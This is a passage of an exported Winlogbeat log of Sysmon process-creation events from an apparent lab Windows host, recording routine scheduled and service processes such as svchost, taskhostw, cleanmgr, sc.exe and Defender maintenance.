ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:472"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft .NET Framework optimization service"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.7.3760.0 built by: NET472REL1LAST_C"	" - "	"MD5=709DFD4075769404C46BD071EA785DBA,SHA256=21BC6B8F3E042654CE06F4DBE9780AE77179F6F012C1BF01063CA5CC26539622,IMPHASH=00000000000000000000000000000000"	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"NGenTask.exe"	"taskhostw.exe"	"C:\Windows\System32\taskhostw.exe"	"{6e4a868b-05df-6a18-2301-000000002300}"	3864	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-3101-000000002300}"	6628	"Microsoft® .NET Framework"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.628"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16462	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.619"	"KhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.617
ProcessGuid: {6e4a868b-05df-6a18-3001-000000002300}
ProcessId: 6292
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-3001-000000002300}"	6292	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.617"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16461	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.399"	"KRDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.397
ProcessGuid: {6e4a868b-05df-6a18-2901-000000002300}
ProcessId: 3808
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2901-000000002300}"	3808	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.397"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16460	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.389"	"KBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.386
ProcessGuid: {6e4a868b-05df-6a18-2801-000000002300}
ProcessId: 5348
Image: C:\Windows\System32\cleanmgr.exe
FileVersion: 10.0.17763.7309 (WinBuild.160101.0800)
Description: Disk Space Cleanup Manager for Windows
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CLEANMGR.DLL
CommandLine: ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=918DB7DCBA70EAB00D9B273543F8508B,SHA256=BB8B64B58CF11AE77C579DCD9CCE5B481B480ECCFDB324500743AC10F754C5D0,IMPHASH=95172E4130AE393A2B8D4D18C7BB1D36
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:"	"Microsoft Corporation"	"C:\Windows\system32\"	"Disk Space Cleanup Manager for Windows"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.7309 (WinBuild.160101.0800)"	" - "	"MD5=918DB7DCBA70EAB00D9B273543F8508B,SHA256=BB8B64B58CF11AE77C579DCD9CCE5B481B480ECCFDB324500743AC10F754C5D0,IMPHASH=95172E4130AE393A2B8D4D18C7BB1D36"	"C:\Windows\System32\cleanmgr.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"CLEANMGR.DLL"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2801-000000002300}"	5348	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:43.386"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16459	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.356"	"JxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.353
ProcessGuid: {6e4a868b-05df-6a18-2701-000000002300}
ProcessId: 3848
Image: C:\Windows\System32\AppHostRegistrationVerifier.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: App Uri Handlers Registration Verifier
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: AppHostNameRegistrationVerifier.exe
CommandLine: ""C:\Windows\system32\AppHostRegistrationVerifier.exe""
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D941415B8862E74D78F9A8EA13587AB0,SHA256=F9CD903372E1AC1982D94CE279D420CE99A865D54681EDF4D9512F319D7EDE36,IMPHASH=8D965FB1B2ED7357844CE14892233CD3
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\AppHostRegistrationVerifier.exe"""	"Microsoft Corporation"	"C:\Windows\system32\"	"App Uri Handlers Registration Verifier"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1697 (WinBuild.160101.0800)"	" - "	"MD5=D941415B8862E74D78F9A8EA13587AB0,SHA256=F9CD903372E1AC1982D94CE279D420CE99A865D54681EDF4D9512F319D7EDE36,IMPHASH=8D965FB1B2ED7357844CE14892233CD3"	"C:\Windows\System32\AppHostRegistrationVerifier.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"AppHostNameRegistrationVerifier.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2701-000000002300}"	3848	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:43.353"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16458	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.354"	"JhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.351
ProcessGuid: {6e4a868b-05df-6a18-2601-000000002300}
ProcessId: 1968
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {6e4a868b-012d-6a18-e503-000000000000}
LogonId: 0x3E5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012d-6a18-e503-000000000000}"	0x3e5	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2601-000000002300}"	1968	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\LOCAL SERVICE"	"2026-05-28 09:07:43.351"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16457	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.320"	"JRDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.319
ProcessGuid: {6e4a868b-05df-6a18-2501-000000002300}
ProcessId: 1296
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2501-000000002300}"	1296	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:43.319"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16456	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.315"	"JBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.314
ProcessGuid: {6e4a868b-05df-6a18-2301-000000002300}
ProcessId: 3864
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2301-000000002300}"	3864	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.314"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16455	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.311"	"IxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.309
ProcessGuid: {6e4a868b-05df-6a18-2101-000000002300}
ProcessId: 3364
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: ""C:\Windows\system32\sc.exe"" start w32time task_started
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {6e4a868b-012d-6a18-e503-000000000000}
LogonId: 0x3E5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=ABB56882148DE65D53ABFC55544A49A8,SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B,IMPHASH=35A7FFDE18D444A92D32C8B2879450FF
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\sc.exe"" start w32time task_started"	"Microsoft Corporation"	"C:\Windows\system32\"	"Service Control Manager Configuration Tool"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=ABB56882148DE65D53ABFC55544A49A8,SHA256=78097C7CD0E57902536C60B7FA17528C313DB20869E5F944223A0BA4C801D39B,IMPHASH=35A7FFDE18D444A92D32C8B2879450FF"	"C:\Windows\System32\sc.exe"	" - "	System	"{6e4a868b-012d-6a18-e503-000000000000}"	0x3e5	"sc.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2101-000000002300}"	3364	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\LOCAL SERVICE"	"2026-05-28 09:07:43.309"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16454	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.307"	"IhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.306
ProcessGuid: {6e4a868b-05df-6a18-2001-000000002300}
ProcessId: 3304
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe
FileVersion: 4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)
Description: Microsoft Malware Protection Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpCmdRun.exe
CommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft Malware Protection Command Line Utility"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)"	" - "	"MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C"	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"MpCmdRun.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-2001-000000002300}"	3304	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	